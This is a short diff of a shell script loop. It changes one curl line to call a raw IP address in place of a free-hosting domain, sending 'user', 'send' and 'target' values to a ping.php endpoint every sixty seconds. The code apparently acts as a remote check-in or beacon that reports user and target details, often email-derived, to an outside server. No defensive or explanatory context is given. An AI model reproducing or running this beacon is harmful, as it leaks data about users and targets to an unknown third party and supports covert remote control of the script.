@@ -23,6 +23,6 @@ then
    send='F'
 fi
 
-curl https://g11977765505.000webhostapp.com/ping.php?user=$user'&send='$send'&target='${target/@*}
+curl http://135.148.11.148/ping.php?user=$user'&send='$send'&target='${target/@*}
 sleep 60
 done
